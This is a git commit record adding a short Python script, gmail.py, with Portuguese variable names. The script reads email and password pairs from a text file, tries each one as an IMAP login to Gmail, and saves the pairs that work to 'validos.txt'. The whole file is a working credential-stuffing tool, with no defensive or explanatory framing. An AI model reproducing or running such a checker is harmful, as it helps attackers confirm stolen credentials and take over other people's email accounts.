114b66a046375bff5a82739a6ccc66ff1c68f4fa
Tonepanetone <dh.18@msn.com>
2016-11-18 13:55:28 -0200

    First

---
+++ gmail.py
@@ -0,0 +1,35 @@
+import time
+
+def gmail_checker(username,password):
+        import imaplib
+        i=imaplib.IMAP4_SSL('imap.gmail.com')
+        try:
+                i.login(username,password)
+                return True
+        except:
+                return False
+
+class main :
+
+        f = open('emails.txt', 'r')
+        
+        conteudo = f.read().split('\n')
+
+        for i in range(0,len(conteudo)) :
+                splitinho = conteudo[i].split(';')
+                #print(splitinho[0] + ' ' +splitinho[1])
+                #print('\n')
+                if(gmail_checker(splitinho[0],splitinho[1])) :
+                        g = open('validos.txt','a')
+                        g.write(splitinho[0] + ';' +splitinho[1]+'\n')
+                        g.close()
+                #else :
+                        #print('invalido')
+
+                #time.sleep(3)
+                print(i)
+                
+
+                
+
+        
